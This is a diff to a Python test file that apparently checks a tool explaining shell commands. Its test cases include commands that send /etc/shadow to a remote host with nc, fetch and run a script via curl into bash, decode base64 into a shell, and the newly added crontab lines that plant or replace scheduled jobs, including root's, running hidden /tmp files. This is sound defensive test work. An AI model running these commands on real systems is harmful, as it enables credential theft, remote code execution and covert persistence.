@@ -42,6 +42,7 @@ def test_decode_pipe_shell_forms(parse_text, resolver, text):
     ("echo aWQ= | base64 -d | xargs -I{} sh -c '{}'", "xargs"),
     ("cat /etc/shadow | nc 203.0.113.5 4444", "nc"),
     ("echo aWQ= | base64 -d | perl", "perl"),
+    ("(crontab -r; echo '*/5 * * * * /tmp/.x') | crontab -", "crontab"),
 ])
 def test_a_command_the_rule_does_not_describe_marks_the_gloss_partial(parse_text, resolver, text, word):
     gloss = glossed(parse_text, resolver, text + "\n").lines[0].gloss
@@ -56,6 +57,8 @@ def test_a_command_the_rule_does_not_describe_marks_the_gloss_partial(parse_text
     "bash <(curl -s http://203.0.113.5/x.sh)",
     "sudo cat /etc/shadow | head -5 | sort",
     "whoami",
+    "(crontab -l 2>/dev/null; echo '*/10 * * * * /tmp/.s2') | crontab -",
+    "(crontab -u root -l; echo '@reboot /tmp/.s2') | crontab -u root -",
 ])
 def test_a_line_the_rule_describes_whole_is_not_partial(parse_text, resolver, text):
     gloss = glossed(parse_text, resolver, text + "\n").lines[0].gloss
